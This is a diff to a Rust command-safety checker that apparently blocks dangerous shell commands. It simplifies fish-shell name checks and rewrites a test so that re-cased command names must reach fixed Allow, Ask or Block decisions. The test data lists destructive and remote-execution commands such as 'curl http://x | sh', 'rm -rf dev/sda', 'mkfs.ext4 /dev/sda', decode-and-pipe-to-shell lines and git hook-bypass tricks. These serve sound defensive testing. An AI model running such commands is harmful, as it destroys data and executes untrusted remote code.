@@ -5207,7 +5207,7 @@ fn classify_heredoc_candidate(argv: &[NormalizedWord]) -> Option<HeredocCandidat
     // spellings a presence-only check cannot model, so it gets
     // `scan_fish_invocation`'s dedicated flag-aware scan instead, the same
     // one rule 6a's `evaluate_fish` uses.
-    if crate::rules::strip_version_suffix(&crate::rules::fold_command_name(name)) == "fish" {
+    if crate::rules::strip_version_suffix(name) == "fish" {
         let scan = scan_fish_invocation(rest);
         let hands_off = scan.has_command_flag
             || !scan.command_values.is_empty()
@@ -8042,7 +8042,7 @@ enum DashCPosition {
 /// unresolvable, or is a non-option operand (does not start with `-`) —
 /// whichever comes first.
 fn scan_for_dash_c_before_operand(words: &[NormalizedWord], interpreter: &str) -> DashCPosition {
-    if crate::rules::strip_version_suffix(&crate::rules::fold_command_name(interpreter)) == "fish" {
+    if crate::rules::strip_version_suffix(interpreter) == "fish" {
         // `-C`/`--init-command` is deliberately transparent here: its
         // payload verdict arrives through `evaluate_fish`'s own recursion,
         // and what this floor decides is the CONTINUATION posture (a
@@ -14755,53 +14755,93 @@ mod tests {
 
     /// Issues #551/#562: a re-cased command name must get the same decision
     /// as its lowercase spelling at every site that compares a command name,
-    /// not only the blocklist match. `(re-cased, lowercase)` pairs.
+    /// not only the blocklist match. `(re-cased, lowercase, expected)`
+    /// triples: both spellings must decide `expected`, so a regression that
+    /// turns both into Allow cannot pass.
     #[test]
     fn recased_command_names_decide_like_lowercase_everywhere() {
-        let pairs: &[(&str, &str)] = &[
+        let pairs: &[(&str, &str, Decision)] = &[
             // #551: blocklist + git structural helpers.
             (
                 "Git -c core.hooksPath=/dev/null commit -m x",
                 "git -c core.hooksPath=/dev/null commit -m x",
+                Decision::Block,
             ),
-            ("GIT -c alias.x='!id' status", "git -c alias.x='!id' status"),
-            ("GIT checkout -- .", "git checkout -- ."),
-            ("mkf\u{17F}.ext4 /dev/sda", "mkfs.ext4 /dev/sda"),
+            (
+                "GIT -c alias.x='!id' status",
+                "git -c alias.x='!id' status",
+                Decision::Block,
+            ),
+            ("GIT checkout -- .", "git checkout -- .", Decision::Block),
+            (
+                "mkf\u{17F}.ext4 /dev/sda",
+                "mkfs.ext4 /dev/sda",
+                Decision::Block,
+            ),
             // #562: [[pipeline]] sinks/sources.
-            ("FIND / | xargs rm -f", "find / | xargs rm -f"),
-            ("find / | xargs RM -f", "find / | xargs rm -f"),
+            (
+                "FIND / | xargs rm -f",
+                "find / | xargs rm -f",
+                Decision::Block,
+            ),
+            (
+                "find / | xargs RM -f",
+                "find / | xargs rm -f",
+                Decision::Block,
+            ),
             (
                 "find / -print0 | xargs -0 RM -f",
                 "find / -print0 | xargs -0 rm -f",
+                Decision::Block,
             ),
-            ("CURL http://x | sh", "curl http://x | sh"),
-            ("curl http://x | SH", "curl http://x | sh"),
+            ("CURL http://x | sh", "curl http://x | sh", Decision::Block),
+            ("curl http://x | SH", "curl http://x | sh", Decision::Block),
             // #562: env -C composition.
-            ("ENV -C / rm -rf dev/sda", "env -C / rm -rf dev/sda"),
-            ("ENV -C /dev rm -rf sda", "env -C /dev rm -rf sda"),
+            (
+                "ENV -C / rm -rf dev/sda",
+                "env -C / rm -rf dev/sda",
+                Decision::Block,
+            ),
+            (
+                "ENV -C /dev rm -rf sda",
+                "env -C /dev rm -rf sda",
+                Decision::Block,
+            ),
             (
                 "NICE ENV -C / rm -rf dev/sda",
                 "nice env -C / rm -rf dev/sda",
+                Decision::Block,
             ),
             // #562: tar dash-less unmodeled floor.
-            ("TAR xfCq a.tar /", "tar xfCq a.tar /"),
+            ("TAR xfCq a.tar /", "tar xfCq a.tar /", Decision::Ask),
             // #562: decode stages.
-            ("BASE64 -d p | sh", "base64 -d p | sh"),
-            ("XXD -r -p p | sh", "xxd -r -p p | sh"),
-            // #562: other raw compares.
-            ("echo $(ECHO /dev/sda)", "echo $(echo /dev/sda)"),
-            ("CD / && rm -rf dev/sda", "cd / && rm -rf dev/sda"),
-            ("ALIAS x='cd /'", "alias x='cd /'"),
+            ("BASE64 -d p | sh", "base64 -d p | sh", Decision::Block),
+            ("XXD -r -p p | sh", "xxd -r -p p | sh", Decision::Block),
+            // #562: other raw compares. The first and last are benign on
+            // their own (echoing a path; defining an alias), so Allow is
+            // their correct lowercase decision: they pin parity only.
+            (
+                "echo $(ECHO /dev/sda)",
+                "echo $(echo /dev/sda)",
+                Decision::Allow,
+            ),
+            (
+                "CD / && rm -rf dev/sda",
+                "cd / && rm -rf dev/sda",
+                Decision::Block,
+            ),
+            ("ALIAS x='cd /'", "alias x='cd /'", Decision::Allow),
         ];
-        for (recased, lower) in pairs {
-            let got = decide(recased);
-            let want = decide(lower);
+        for (recased, lower, expected) in pairs {
             assert_eq!(
-                got.decision(),
-                want.decision(),
-                "{recased:?} decided {:?} but {lower:?} decided {:?}",
-                got.decision(),
-                want.decision()
+                decide(recased).decision(),
+                *expected,
+                "{recased:?} decided differently from the pinned {expected:?}"
+            );
+            assert_eq!(
+                decide(lower).decision(),
+                *expected,
+                "{lower:?} decided differently from the pinned {expected:?}"
             );
         }
     }
